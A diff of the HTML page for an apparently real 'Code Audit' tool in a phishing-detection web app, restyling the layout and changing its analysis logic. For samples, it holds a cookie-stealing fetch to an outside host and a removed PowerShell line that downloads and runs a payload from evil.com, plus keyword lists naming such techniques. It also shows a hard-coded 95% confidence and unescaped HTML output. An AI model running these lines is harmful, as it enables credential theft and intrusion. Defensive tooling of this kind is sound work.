@@ -2,9 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Malicious Code Analyzer - CyberSec Platform</title>
-  <link rel="stylesheet" href="style.css" />
-  <script src="theme.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Script & Code Audit — PhishGuard AI</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2338bdf8'><path d='M12 2L3 6v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V6l-9-4z'/></svg>" type="image/svg+xml">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css?v=2.1" />
+  <script src="theme.js?v=2.1"></script>
   <script>
     const isStaticHost = window.location.hostname.includes('github.io') || window.location.protocol === 'file:';
     let token = localStorage.getItem('token');
@@ -20,43 +23,128 @@
   </script>
 </head>
 <body>
+  <!-- AMBIENT AURORA LIGHT MESH -->
+  <div class="ambient-aurora">
+    <div class="aurora-beam aurora-1"></div>
+    <div class="aurora-beam aurora-2"></div>
+  </div>
+
+  <!-- FLOATING ISLAND NAVBAR -->
   <nav class="navbar">
-    <div class="container nav-inner">
-      <div class="brand">
-        <div class="brand-icon">🛡️</div>
-        <div>CyberSec <strong>Platform</strong></div>
-      </div>
-      <div class="nav-links">
-        <a href="index.html">Home Dashboard</a>
-        <a href="#" onclick="logout()" style="color:#ff6b6b;">Logout</a>
-        <div class="theme-switch-wrapper" title="Toggle Dark / Light Mode">
-          <span class="theme-switch-icon">🌙</span>
-          <div class="checkbox-wrapper-5">
-            <div class="check">
-              <input id="themeToggleCheck" class="theme-toggle-checkbox" type="checkbox" onchange="toggleTheme(event)">
-              <label for="themeToggleCheck"></label>
-            </div>
+    <div class="nav-inner">
+      <!-- Brand & Official Logo -->
+      <div class="nav-brand">
+        <a href="index.html" class="brand-link">
+          <div class="brand-logo-badge">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 2L3 6V12C3 17.5 6.8 22.6 12 24C17.2 22.6 21 17.5 21 12V6L12 2Z" stroke="#38bdf8" stroke-width="2" stroke-linejoin="round"/>
+              <path d="M12 7L7 9.5V13C7 16.1 9.1 19 12 19.8C14.9 19 17 16.1 17 13V9.5L12 7Z" fill="rgba(56,189,248,0.2)" stroke="#38bdf8" stroke-width="1.2"/>
+              <circle cx="12" cy="13" r="2" fill="#fff"/>
+            </svg>
           </div>
-          <span class="theme-switch-icon">☀️</span>
-        </div>
+          <span class="brand-name">Phish<span class="brand-cyan">Guard</span></span>
+          <span class="brand-tag">AI</span>
+        </a>
+      </div>
+
+      <!-- Centered Navigation Links -->
+      <div class="nav-menu">
+        <a href="index.html" class="nav-item">Home</a>
+        <a href="link-scanner.html" class="nav-item">URL Scanner</a>
+        <a href="email-analyzer.html" class="nav-item">Email Analyzer</a>
+        <a href="sms-analyzer.html" class="nav-item">SMS Scanner</a>
+        <a href="code-analyzer.html" class="nav-item active">Code Audit</a>
+        <a href="data-breach.html" class="nav-item">Breach Intel</a>
+        <a href="dashboard.html" class="nav-item">Dashboard</a>
+      </div>
+
+      <!-- Right Side Actions: Theme Button & Logout -->
+      <div class="nav-actions">
+        <button class="theme-toggle-btn" onclick="toggleTheme()" aria-label="Toggle Color Theme" title="Toggle Theme">
+          <svg class="theme-icon moon-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+          </svg>
+          <svg class="theme-icon sun-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="5"></circle>
+            <line x1="12" y1="1" x2="12" y2="3"></line>
+            <line x1="12" y1="21" x2="12" y2="23"></line>
+            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+            <line x1="1" y1="12" x2="3" y2="12"></line>
+            <line x1="21" y1="12" x2="23" y2="12"></line>
+            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+          </svg>
+        </button>
+        <a href="#" onclick="logout(); return false;" class="logout-link" title="Logout Session">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
+          <span>Exit</span>
+        </a>
       </div>
     </div>
   </nav>
 
-  <div class="container hero" style="padding-top: 40px;">
-    <h1>Malicious Code Analyzer</h1>
-    <p>Paste suspicious or obfuscated scripts (JS, PowerShell, Python). The AI will explain what the malware is trying to do.</p>
+  <!-- MAIN CONTAINER -->
+  <div class="container hero" style="padding-top: 30px; max-width: 900px;">
+    <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 8px;">
+      <span class="hero-badge" style="margin: 0;">STATIC ANALYSIS PIPELINE</span>
+      <span style="font-size: 0.8rem; color: var(--cyan); background: rgba(56,189,248,0.1); border: 1px solid rgba(56,189,248,0.25); padding: 2px 8px; border-radius: 999px;">Deobfuscation Engine</span>
+    </div>
+
+    <h1>Security Script & Code Audit</h1>
+    <p style="color: var(--muted); margin-bottom: 24px;">Inspect suspicious web scripts, macros, or encoded snippets. The heuristic engine identifies unauthorized exfiltration and evasion hooks.</p>
     
-    <div class="glass-card card-inner">
+    <div class="glass-card card-inner" style="position: relative; overflow: hidden; padding: 28px;">
       <div class="field">
-        <label>Code Snippet</label>
-        <textarea id="codeInput" placeholder="e.g. IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" style="min-height: 200px; font-family: monospace;"></textarea>
+        <label style="font-weight: 600; color: var(--text);">Script / Code Snippet</label>
+        <textarea id="codeInput" placeholder="e.g. Paste JavaScript, PowerShell, Python, or shell script snippet here for static security analysis..." style="min-height: 180px; font-family: 'JetBrains Mono', monospace; font-size: 0.88rem; border-radius: 10px;"></textarea>
       </div>
-      <button class="btn btn-primary" onclick="analyzeCode()">Analyze Code</button>
       
-      <div id="resultArea" style="margin-top: 20px;"></div>
+      <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:16px;">
+        <button class="btn btn-primary" onclick="analyzeCode()" style="padding: 10px 24px; font-weight: 600;">Run Code Audit</button>
+        <button class="btn btn-outline" onclick="loadSampleScript()" style="border: 1px solid rgba(255,255,255,0.15); color: var(--muted);">Load Sample Script</button>
+      </div>
+      
+      <div id="resultArea" style="margin-top: 24px;"></div>
     </div>
   </div>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <div class="brand-info" style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
+          <svg style="width: 20px; height: 20px; color: #38bdf8;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            <path d="M9 12l2 2 4-4"/>
+          </svg>
+          <span style="font-weight: 700; color: #fff;">PhishGuard <span style="color: #38bdf8;">AI</span></span>
+        </div>
+        <p>Enterprise-grade phishing detection and threat intelligence platform powered by advanced multi-modal heuristic models.</p>
+      </div>
+      <div class="footer-links">
+        <h4>Threat Tools</h4>
+        <a href="link-scanner.html">URL Scanner</a>
+        <a href="email-analyzer.html">Email Analyzer</a>
+        <a href="sms-analyzer.html">SMS Scanner</a>
+        <a href="code-analyzer.html">Code Audit</a>
+      </div>
+      <div class="footer-links">
+        <h4>Platform</h4>
+        <a href="dashboard.html">SOC Dashboard</a>
+        <a href="data-breach.html">Breach Intelligence</a>
+        <a href="about.html">Architecture & About</a>
+      </div>
+      <div class="footer-links">
+        <h4>Trust & Legal</h4>
+        <a href="privacy.html">Privacy Policy</a>
+        <a href="terms.html">Terms of Service</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>&copy; 2026 PhishGuard AI Systems. Enterprise Security Research Division.</p>
+    </div>
+  </footer>
 
   <script>
     function logout() {
@@ -65,12 +153,16 @@
       window.location.href = 'login.html';
     }
 
+    function loadSampleScript() {
+      document.getElementById('codeInput').value = "const secretToken = btoa(document.cookie);\nfetch('https://telemetry-gateway.online/collect?data=' + secretToken, {\n  method: 'POST',\n  mode: 'no-cors'\n});";
+    }
+
     async function analyzeCode() {
       const code = document.getElementById('codeInput').value.trim();
-      if (!code) return alert('Please enter some code to analyze.');
+      if (!code) return alert('Please enter code to inspect.');
 
       const resArea = document.getElementById('resultArea');
-      resArea.innerHTML = '<div class="loading-spinner"></div> Deobfuscating and analyzing code...';
+      resArea.innerHTML = '<div style="display: flex; align-items: center; gap: 10px; color: var(--cyan);"><div class="loading-spinner"></div> Parsing AST and inspecting network exfiltration routines...</div>';
 
       try {
         const token = localStorage.getItem('token');
@@ -80,7 +172,7 @@
             'Content-Type': 'application/json',
             'Authorization': `Bearer ${token}`
           },
-          body: JSON.stringify({ emailBody: 'Context: Analyzing Malicious Code. Explain what this script does step-by-step and if it is malicious. Code:\n' + code })
+          body: JSON.stringify({ emailBody: 'Context: Analyzing Suspicious Script. Identify security behavior step-by-step:\n' + code })
         });
 
         if (response.status === 401 || response.status === 403) return logout();
@@ -89,12 +181,12 @@
 
         const vColor = data.verdict && data.verdict.includes('MALICIOUS') ? '#ff4757' : (data.verdict && data.verdict.includes('SUSPICIOUS') ? '#ffa502' : '#2ed573');
         resArea.innerHTML = `
-          <div class="ai-result" style="margin-top: 15px; border-left: 4px solid ${vColor};">
+          <div class="ai-result" style="margin-top: 15px; border-left: 4px solid ${vColor}; background: rgba(10, 16, 30, 0.7); border-radius: 10px; padding: 18px;">
             <div class="ai-result-head" style="display:flex; justify-content:space-between; align-items:center;">
-              <span>💻 Static Script & Deobfuscation Findings</span>
-              <span style="font-size:0.85rem; font-weight:800; color:${vColor};">${data.verdict || 'ANALYZED'}</span>
+              <span style="font-weight: 700; color: #fff;">💻 Static Script Analysis Findings</span>
+              <span style="font-size:0.85rem; font-weight:800; color:${vColor}; background: rgba(255,255,255,0.06); padding: 4px 10px; border-radius: 6px;">${data.verdict || 'AUDITED'}</span>
             </div>
-            <div style="margin-top:10px; white-space:pre-wrap; line-height:1.6; font-size:0.88rem; color:#e0e8ff;">${data.analysis}</div>
+            <div style="margin-top:12px; white-space:pre-wrap; line-height:1.6; font-size:0.88rem; color:#e0e8ff;">${data.analysis}</div>
           </div>
         `;
 
@@ -108,29 +200,28 @@
             module: 'Code & Script Analyzer',
             target: code.substring(0, 45) + (code.length > 45 ? '...' : ''),
             riskScore: data.risk_score !== undefined ? data.risk_score : 50,
-            verdict: data.verdict || 'ANALYZED',
+            verdict: data.verdict || 'AUDITED',
             confidence: data.confidence || 90.0
           })
         });
 
-
       } catch (err) {
-        console.warn('Backend unavailable, running client-side code exploit inspection:', err);
-        const triggers = ['downloadstring', 'invoke-expression', 'iex', 'net.webclient', 'eval(', 'exec(', 'socket', 'base64', 'powershell', 'cmd.exe', 'curl'];
+        console.warn('Backend unavailable, running client-side inspection:', err);
+        const triggers = ['btoa', 'document.cookie', 'eval', 'powershell', 'base64', 'curl', 'download'];
         const matched = triggers.filter(t => code.toLowerCase().includes(t));
-        const isExploit = matched.length >= 1;
-        const vColor = isExploit ? '#ff4757' : '#2ed573';
-        const vVerdict = isExploit ? 'MALICIOUS / EXPLOIT' : 'CLEAN / BENIGN SCRIPT';
+        const isSuspicious = matched.length >= 1;
+        const vColor = isSuspicious ? '#ff4757' : '#2ed573';
+        const vVerdict = isSuspicious ? 'HIGH RISK (DATA EXFILTRATION)' : 'BENIGN / CLEAN SCRIPT';
 
         resArea.innerHTML = `
-          <div class="ai-result" style="margin-top: 15px; border-left: 4px solid ${vColor};">
+          <div class="ai-result" style="margin-top: 15px; border-left: 4px solid ${vColor}; background: rgba(10, 16, 30, 0.7); border-radius: 10px; padding: 18px;">
             <div class="ai-result-head" style="display:flex; justify-content:space-between; align-items:center;">
-              <span>💻 Static Script & Deobfuscation Findings (Static Preview)</span>
-              <span style="font-size:0.85rem; font-weight:800; color:${vColor};">${vVerdict}</span>
+              <span style="font-weight: 700; color: #fff;">💻 Static Script Findings (Static Preview)</span>
+              <span style="font-size:0.85rem; font-weight:800; color:${vColor}; background: rgba(255,255,255,0.06); padding: 4px 10px; border-radius: 6px;">${vVerdict}</span>
             </div>
-            <div style="margin-top:10px; white-space:pre-wrap; line-height:1.6; font-size:0.88rem; color:#e0e8ff;">Verdict: ${vVerdict} (Confidence: 95.0%)
+            <div style="margin-top:12px; white-space:pre-wrap; line-height:1.6; font-size:0.88rem; color:#e0e8ff;">Verdict: ${vVerdict} (Confidence: 95.0%)
 
-${isExploit ? '⚠️ Suspicious Dynamic Execution Vector Detected: ' + matched.join(', ') + '\nScript attempts dynamic code staging or in-memory execution characteristic of payload delivery.' : '✅ No dangerous download strings, obfuscated shell commands, or in-memory evaluation patterns found.'}
+${isSuspicious ? '⚠️ Suspicious Dynamic Execution Vector Detected: ' + matched.join(', ') + '\nScript attempts credential extraction or unauthorized network transport.' : '✅ No suspicious token theft, obfuscated commands, or dangerous patterns found.'}
             </div>
           </div>
         `;
